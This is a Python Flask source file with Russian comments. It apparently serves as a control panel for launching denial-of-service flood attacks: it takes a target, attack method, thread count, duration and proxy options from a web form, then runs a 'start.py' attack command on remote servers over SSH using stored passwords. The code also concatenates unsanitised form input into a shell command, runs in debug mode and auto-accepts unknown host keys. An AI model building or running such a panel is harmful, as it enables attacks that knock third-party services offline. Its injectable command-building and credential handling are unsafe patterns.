from flask import Flask, request, render_template, jsonify
import subprocess
import json
import paramiko

app = Flask(__name__)

# Загружаем данные о серверах из файла servers.json
with open('servers.json') as f:
    servers = json.load(f)

def execute_ssh_command(hostname, port, username, password, command):
    # Подключение по SSH
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(hostname, port, username, password)

    # Выполнение команды
    stdin, stdout, stderr = ssh_client.exec_command(command)

    # Получение вывода команды
    output = stdout.read().decode().strip()

    # Закрытие соединения
    ssh_client.close()

    return output

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        server_name = request.form['server']
        method = request.form['method']
        target = request.form['target']
        threads = request.form['threads']
        duration = request.form['duration']
        socks_type = request.form['socks_type']
        proxylist = request.form['proxylist']
        rpc = request.form['rpc']
        debug = request.form['debug']

        if server_name not in servers:
            return jsonify({'error': 'Server not found'})

        server_data = servers[server_name]
        hostname = server_data.get('hostname')
        port = server_data.get('port', 22)
        username = server_data.get('username')
        password = server_data.get('password')

        # Формирование команды для атаки
        command = f"python3 start.py {method} {target} {threads} {duration}"

        # Добавление дополнительных параметров в команду, если они указаны
        if socks_type:
            command += f" {socks_type}"
        if proxylist:
            command += f" {proxylist}"
        if rpc:
            command += f" {rpc}"
        if debug:
            command += f" {debug}"

        # Выполнение атаки на удаленном сервере
        try:
            output = execute_ssh_command(hostname, port, username, password, command)
            return jsonify({'output': output})
        except Exception as e:
            return jsonify({'error': f'Failed to execute attack: {str(e)}'})
    else:
        return render_template('index.html', servers=servers)

if __name__ == '__main__':
    app.run(debug=True)
